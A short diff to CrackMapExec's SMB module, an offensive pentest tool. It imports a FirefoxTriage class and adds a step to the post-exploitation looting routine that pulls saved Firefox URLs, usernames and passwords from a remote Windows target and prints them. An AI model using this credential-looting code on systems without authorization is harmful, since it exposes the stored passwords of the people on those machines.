@@ -23,6 +23,7 @@ from impacket.krb5.kerberosv5 import SessionKeyDecryptionError
 from impacket.krb5.types import KerberosException
 from cme.connection import *
 from cme.logger import CMEAdapter
+from cme.protocols.smb.firefox import FirefoxTriage
 from cme.servers.smb import CMESMBServer
 from cme.protocols.smb.wmiexec import WMIEXEC
 from cme.protocols.smb.atexec import TSCH_EXEC
@@ -1276,6 +1277,15 @@ class smb(connection):
                     self.logger.highlight("[%s][IEX] %s - %s:%s" % (vault.winuser, vault.resource+' -' if vault.resource!= '' else '-', vault.username, vault.password))
         except Exception as e:
             self.logger.debug("Error while looting vaults: {}".format(e))
+
+        try:
+            # Collect Firefox stored secrets
+            firefox_triage = FirefoxTriage(target=target, logger=self.logger, conn=conn)
+            firefox_credentials = firefox_triage.run()
+            for credential in firefox_credentials:
+                self.logger.highlight("[%s][FIREFOX] %s %s:%s" % (credential.winuser, credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
+        except Exception as e:
+            self.logger.debug("Error while looting firefox: {}".format(e))
 
     @requires_admin
     def lsa(self):
